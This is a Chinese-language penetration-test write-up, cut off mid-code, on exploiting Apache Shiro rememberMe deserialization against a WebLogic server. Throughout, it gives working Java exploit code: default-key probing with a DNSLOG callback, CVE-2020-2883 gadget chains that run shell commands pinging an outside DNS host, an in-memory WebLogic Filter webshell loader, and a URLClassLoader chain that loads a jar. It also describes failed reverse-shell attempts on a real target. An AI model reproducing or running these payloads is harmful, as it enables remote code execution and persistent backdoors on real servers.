在项目中碰到了Shiro的反序列化，用工具打发现没有成功，然后发现报错是weblogic的，想到了之前研究的WebLogic的几个CVE，遂对其展开研究。
# 纵观全局
本文涉及如下知识点:
  1. 如何判断shiro正确的key
  2. 构造CVE-2020-2883、CVE-2020-2555 gadget
  3. WebLogic 内存shell
  4. CVE-2020-2883加载字节码
  5. 如何实现Filter类型的蚁剑shell
阅读本文之前，建议先看已经完成好的项目：
# 如何判断Shiro正确的key
两种思路
  1. 根据Shiro的正确逻辑构造正确的Object
  2. URLDNS判断
## 根据Shiro的正确逻辑构造正确的Object
一种思路是 @l1nk3r 师傅在 [《一种另类的 shiro
检测方式》](https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ) 提出来的，简单说一下。
在 `org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals` 中
先获取cookie的bytes，然后进入convertBytesToPrincipals()
在这个方法中先解密byte数组，然后反序列化对象。
反序列化时强制转换为PrincipalCollection类型，那么我们构造一个空的PrincipalCollection对象，key错误时返回rememberMe=deleteMe，正确时不返回。
PrincipalCollection是一个接口，继承他的类有如图
SimplePrincipalCollection就是我们要用的，手动构造
    package org.chabug.test;
    import org.apache.shiro.subject.SimplePrincipalCollection;
    import org.chabug.utils.Serializables;
    import org.unicodesec.EncryptUtil;
    import java.io.IOException;
    public class ShiroKey {
        public static void main(String[] args) throws IOException {
            SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
            byte[] bytes = Serializables.serialize(simplePrincipalCollection);
            String key = "kPH+bIxk5D2deZiIxcaaaA==";
            String rememberMe = EncryptUtil.shiroEncrypt(key, bytes);
            System.out.println(rememberMe);
        }
    }
key为`kPH+bIxk5D2deZiIxcaaaA==`正确时不返回deleteMe
错误时`AAA+bIxk5D2deZiIxcaaaA==`返回deleteMe
以此通过枚举key判断返回headers中是否出现了deleteMe即可。
## URLDNS判断
很简单了，直接给代码
    package org.chabug.test;
    import org.chabug.utils.Serializables;
    import org.unicodesec.EncryptUtil;
    import ysoserial.payloads.URLDNS;
    public class ShiroKey {
        public static void main(String[] args) throws Exception {
            URLDNS urldns = new URLDNS();
            Object object = urldns.getObject("http://oq287o.dnslog.cn");
            byte[] buf = Serializables.serialize(object);
            String key = "kPH+bIxk5D2deZiIxcaaaA==";
            String rememberMe = EncryptUtil.shiroEncrypt(key, buf);
            System.out.println(rememberMe);
        }
    }
key正确时会收到DNSLOG请求
到这里，实际项目中判断出来了key为默认的`kPH+bIxk5D2deZiIxcaaaA==`，使用DNSLOG也收到了请求，使用工具跑了一下发现没有可用的gadget。接下来就是根据CVE-2020-2883、CVE-2020-2555这两个CVE来构造gadget进行RCE。
# 构造CVE-2020-2883、CVE-2020-2555 gadget
根据之前的我[分析过的payload](https://github.com/Y4er/CVE-2020-2883/blob/master/CVE_2020_2883.java)拿过来，配上Shiro的加密就完事
    package org.chabug.cve;
    import com.tangosol.util.ValueExtractor;
    import com.tangosol.util.comparator.ExtractorComparator;
    import com.tangosol.util.extractor.ChainedExtractor;
    import com.tangosol.util.extractor.ReflectionExtractor;
    import org.chabug.utils.Serializables;
    import org.unicodesec.EncryptUtil;
    import ysoserial.payloads.util.Reflections;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    public class CVE_2020_2883 {
        public static void main(String[] args) throws Exception {
            ReflectionExtractor reflectionExtractor1 = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[]{}});
            ReflectionExtractor reflectionExtractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[]{}});        //ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"calc"}});
            ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"cmd.exe", "/c", "ping test.oq287o.dnslog.cn"}});
            ValueExtractor[] valueExtractors = new ValueExtractor[]{
                    reflectionExtractor1,
                    reflectionExtractor2,
                    reflectionExtractor3,
            };
            Class clazz = ChainedExtractor.class.getSuperclass();
            Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
            m_aExtractor.setAccessible(true);
            ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
            ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                    reflectionExtractor
            };
            ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);
            PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
            queue.add("1");
            queue.add("1");
            m_aExtractor.set(chainedExtractor1, valueExtractors);
            Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
            queueArray[0] = Runtime.class;
            queueArray[1] = "1";
            byte[] buf = Serializables.serialize(queue);
            String key = "kPH+bIxk5D2deZiIxcaaaA==";
            String rememberMe = EncryptUtil.shiroEncrypt(key, buf);
            System.out.println(rememberMe);
        }
    }
本机测试，很好收到了请求
因为目标是Linux，改成/bin/bash在测试也收到了dnslog请求，然后随手就是一个反弹shell，却发现死活反弹不回来，然后本地监听80、443、8080等常规端口，用curl、wget等命令触发http请求没收到，判断为只出DNS，难受了啊。
此时再想目标机器是WebLogic，可以直接写jsp，通过不断的dnslog回显，base64拼接截取判断找到了war所在的目录(这个过程简直恶心)，写入txt、jsp、jspx均访问不到，难道是SpringMVC？试了多个目录均不行，并且发现目标机器是通过nginx反代WebLogic，内网中2台WebLogic做负载均衡，读的文件一会有一会没有，恶心，真的恶心，但是又不能不搞。
东西都访问不到，只能写内存马了呗，爷就不信搞不定。
# WebLogic 内存shell
作为一个渗透搬砖工程师，不会分析还不会抄？ 关于WebLogic的内存shell如何实现就不分析了，直接抄宽字节安全的文章[《weblogic
无文件webshell的技术研究》](https://www.cnblogs.com/potatsoSec/p/13162792.html)
最终实现了如下代码
    import java.io.*;
    import java.lang.reflect.*;
    import java.util.Map;
    public class WebLogicEcho {
        static {
            try {
                Class executeThread = Class.forName("weblogic.work.ExecuteThread");
                Method m = executeThread.getDeclaredMethod("getCurrentWork");
                Object currentWork = m.invoke(Thread.currentThread());
                Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
                connectionHandlerF.setAccessible(true);
                Object obj = connectionHandlerF.get(currentWork);
                Field requestF = obj.getClass().getDeclaredField("request");
                requestF.setAccessible(true);
                obj = requestF.get(obj);
                Field contextF = obj.getClass().getDeclaredField("context");
                contextF.setAccessible(true);
                Object context = contextF.get(obj);
                Field classLoaderF = context.getClass().getDeclaredField("classLoader");
                classLoaderF.setAccessible(true);
                ClassLoader cl = (ClassLoader) classLoaderF.get(context);
                Field cachedClassesF = cl.getClass().getDeclaredField("cachedClasses");
                cachedClassesF.setAccessible(true);
                Object cachedClass = cachedClassesF.get(cl);
                Method getM = cachedClass.getClass().getDeclaredMethod("get", Object.class);
                if (getM.invoke(cachedClass, "shell") == null) {
                    // this is your shell class byte code
                    byte[] codeClass = new byte[]{22,22,2,2,2,2,2};
                    Method defineClass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defineClass.setAccessible(true);
                    Class evilFilterClass = (Class) defineClass.invoke(cl, codeClass, 0, codeClass.length);
                    String evilName = "gameName" + System.currentTimeMillis();
                    String filterName = "gameFilter" + System.currentTimeMillis();
                    String[] url = new String[]{"/*"};
                    Method putM = cachedClass.getClass().getDeclaredMethod("put", Object.class, Object.class);
                    putM.invoke(cachedClass, filterName, evilFilterClass);
                    Method getFilterManagerM = context.getClass().getDeclaredMethod("getFilterManager");
                    Object filterManager = getFilterManagerM.invoke(context);
                    Method registerFilterM = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                    registerFilterM.setAccessible(true);
                    registerFilterM.invoke(filterManager, evilName, filterName, url, null, null, null);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
宽字节安全的文章中采用的是base64+gzip的形式拿到shell，我是直接通过读文件的形式拿，因为我遇到了几个大坑，慢慢讲。
最开始的时候我是使用PythonInterpreter类加载WebLogicEcho.class字节码的形式，将我写的执行cmd命令的MyFilter的shell直接编译好，然后读取class字节码写入到codeClass数组中，编译什么的都顺利，就是发送过去之后，WebLogic会直接被打挂，多次调试之后发现是因为Python加载字节码数组太长了，导致溢出进程宕掉了。
可以，后来我用URLClassLoader，我把编译好的WebLogicEcho.class打个jar包，命令执行写入目标然后加载类可以了吧。很好，一切都没问题。代码长这样
    package org.chabug.cve;
    import org.chabug.utils.Serializables;
    import com.tangosol.util.ValueExtractor;
    import com.tangosol.util.comparator.ExtractorComparator;
    import com.tangosol.util.extractor.ChainedExtractor;
    import com.tangosol.util.extractor.ReflectionExtractor;
    import org.unicodesec.EncryptUtil;
    import ysoserial.payloads.util.Reflections;
    import java.lang.reflect.Field;
    import java.net.URL;
    import java.net.URLClassLoader;
    import java.util.PriorityQueue;
    public class CVE_2020_2883_URLClassLoader {
        public static void main(String[] args) {
            try {
                ReflectionExtractor extractor1 = new ReflectionExtractor(
                        "getConstructor",
                        new Object[]{new Class[]{URL[].class}}
                );
                // this jar is result of `jar cvf a.jar WebLogicEcho.class`
                ReflectionExtractor extractor2 = new ReflectionExtractor(
                        "newInstance",
    //                    new Object[]{new Object[]{new URL[]{new URL("file:///tmp/tttt.jar")}}}
                        new Object[]{new Object[]{new URL[]{new URL("file:///C:/Users/Administrator/Desktop/tttt.jar")}}}
                );
                // load filter shell
                ReflectionExtractor extractor3 = new ReflectionExtractor(
                        "loadClass",
                        new Object[]{"WebLogicEcho"}
                );
                ReflectionExtractor extractor4 = new ReflectionExtractor(
                        "getConstructor",
                        new Object[]{new Class[]{}}
                );
                ReflectionExtractor extractor5 = new ReflectionExtractor(
                        "newInstance",
                        new Object[]{new Object[]{}}
                );
                ValueExtractor[] valueExtractors = new ValueExtractor[]{
                        extractor1,
                        extractor2,
                        extractor3,
                        extractor4,
                        extractor5,
                };
                Class clazz = ChainedExtractor.class.getSuperclass();
                Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
                m_aExtractor.setAccessible(true);
                ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
                ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                        reflectionExtractor
                };
                ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);
                PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
                queue.add("1");
                queue.add("1");
                m_aExtractor.set(chainedExtractor1, valueExtractors);
                Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
                queueArray[0] = URLClassLoader.class;
                queueArray[1] = "1";
                byte[] buf = Serializables.serialize(queue);
                String key = "kPH+bIxk5D2deZiIxcaaaA==";
                String rememberMe = EncryptUtil.shiroEncrypt(key, buf);
                System.out.println(rememberMe);
            } catch (Exception e) {
                e.printStackTrace();